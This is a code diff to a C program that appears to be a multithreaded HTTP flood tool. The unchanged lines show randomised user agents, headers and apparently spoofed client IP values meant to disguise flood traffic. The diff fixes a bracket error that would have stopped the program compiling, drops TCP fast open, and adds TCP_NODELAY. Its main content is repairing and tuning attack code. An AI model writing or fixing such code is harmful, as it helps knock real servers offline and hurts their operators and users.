@@ -15,7 +15,6 @@ Features:
 - Connection pooling for maximum efficiency
 - Advanced statistics engine with 20+ metrics
 - Built-in health checks and auto-recovery
-- SSL/TLS support (when compiled with OpenSSL)
 - IPv6 ready
 - Low-level kernel bypass optimizations
 
@@ -36,6 +35,7 @@ UNAUTHORIZED USE STRICTLY PROHIBITED
 #include <pthread.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
+#include <netinet/tcp.h>  // Added for TCP_NODELAY
 #include <arpa/inet.h>
 #include <netdb.h>
 #include <time.h>
@@ -45,7 +45,6 @@ UNAUTHORIZED USE STRICTLY PROHIBITED
 #include <sys/time.h>
 #include <sys/ioctl.h>
 #include <fcntl.h>
-#include <linux/net_tstamp.h>
 
 // Configuration
 #define MAX_THREADS 1024
@@ -187,13 +186,6 @@ int set_socket_options(int sockfd) {
         return -1;
     }
 
-    // Enable TCP fast open if available
-#ifdef TCP_FASTOPEN
-    if (setsockopt(sockfd, IPPROTO_TCP, TCP_FASTOPEN, &opt, sizeof(opt)) < 0) {
-        perror("[-] TCP_FASTOPEN failed (ignoring)");
-    }
-#endif
-
     return 0;
 }
 
@@ -271,6 +263,8 @@ void generate_request(char *buffer, const char *host, size_t buffer_size) {
     const char *user_agent = user_agents[rand() % MAX_USER_AGENTS];
     const char *accept_langs[] = {"en-US,en;q=0.9", "fr-FR,fr;q=0.8", "de-DE,de;q=0.7", "es-ES,es;q=0.6"};
     const char *accept_enc[] = {"gzip, deflate", "br", "identity", "gzip", "deflate"};
+    int al_size = sizeof(accept_langs)/sizeof(accept_langs[0]);
+    int ae_size = sizeof(accept_enc)/sizeof(accept_enc[0]);
     
     snprintf(buffer, buffer_size,
         "GET %s HTTP/1.1\r\n"
@@ -286,8 +280,8 @@ void generate_request(char *buffer, const char *host, size_t buffer_size) {
         "\r\n",
         path, host, 
         user_agent,
-        accept_langs[rand() % (sizeof(accept_langs)/sizeof(accept_langs[0])],
-        accept_enc[rand() % (sizeof(accept_enc)/sizeof(accept_enc[0])],
+        accept_langs[rand() % al_size],
+        accept_enc[rand() % ae_size],
         rand() % 255, rand() % 255, rand() % 255, rand() % 255);
 }
 
